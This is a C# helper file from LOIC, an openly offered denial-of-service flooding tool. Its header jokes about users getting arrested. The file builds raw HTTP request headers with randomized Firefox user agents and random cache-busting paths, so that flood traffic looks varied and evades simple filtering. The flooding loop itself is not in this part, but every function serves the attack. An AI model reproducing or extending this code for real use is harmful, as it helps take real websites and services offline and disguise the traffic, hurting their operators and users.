/* LOIC - Low Orbit Ion Cannon
 * Released to the public domain
 * Enjoy getting v&, kids.
 */

using System;
using System.Text;

namespace LOIC
{
	public static class Functions
	{
		private static readonly Random rnd = new Random(Guid.NewGuid().GetHashCode());
		private static readonly String[] ntv = { "6.0", "6.1", "6.2", "6.3", "10.0" };

		public static string RandomString(int length = 6)
		{
			StringBuilder builder = new StringBuilder();

			lock (rnd)
			{
				char ch;
				for (int i = 0; i < length; i++)
				{
					ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * rnd.NextDouble() + 65)));
					builder.Append(ch);
				}
			}

			return builder.ToString();
		}

		public static int RandomInt(int min, int max)
		{
			lock (rnd)
			{
				return rnd.Next(min, max);
			}
		}

		public static string RandomUserAgent()
		{
			lock (rnd)
			{
				if (rnd.NextDouble() >= 0.5)
				{
					return String.Format("Mozilla/5.0 (Windows NT {0}; WOW64; rv:{1}.0) Gecko/20100101 Firefox/{1}.0", ntv[rnd.Next(ntv.Length)], rnd.Next(36, 47));
				}
				else
				{
					return String.Format("Mozilla/5.0 (Windows NT {0}; rv:{1}.0) Gecko/20100101 Firefox/{1}.0", ntv[rnd.Next(ntv.Length)], rnd.Next(36, 47));
				}
			}
		}

		public static object RandomElement(object[] array)
		{
			if(array == null || array.Length < 1)
				return null;

			if(array.Length == 1)
				return array[0];

			lock (rnd)
			{
				return array[rnd.Next(array.Length)];
			}
		}

		public static byte[] RandomHttpHeader(string method, string subsite, string host, bool subsite_random = false, bool gzip = false, int keep_alive = 0)
		{
			return Encoding.ASCII.GetBytes(String.Format("{0} {1}{2} HTTP/1.1{7}Host: {3}{7}User-Agent: {4}{7}Accept: */*{7}{5}{6}{7}", method, subsite, (subsite_random ? RandomString() : ""), host, RandomUserAgent(), (gzip ? "Accept-Encoding: gzip, deflate\r\n" : ""), (keep_alive > 0 ? String.Format("Keep-Alive: {0}\r\nConnection: keep-alive\r\n", keep_alive) : ""), "\r\n"));
		}

		public static bool ParseInt(string str, int min, int max, out int value)
		{
			bool res = int.TryParse(str, out value);

			if (res && value >= min && value <= max)
				return true;

			return false;
		}
	}
}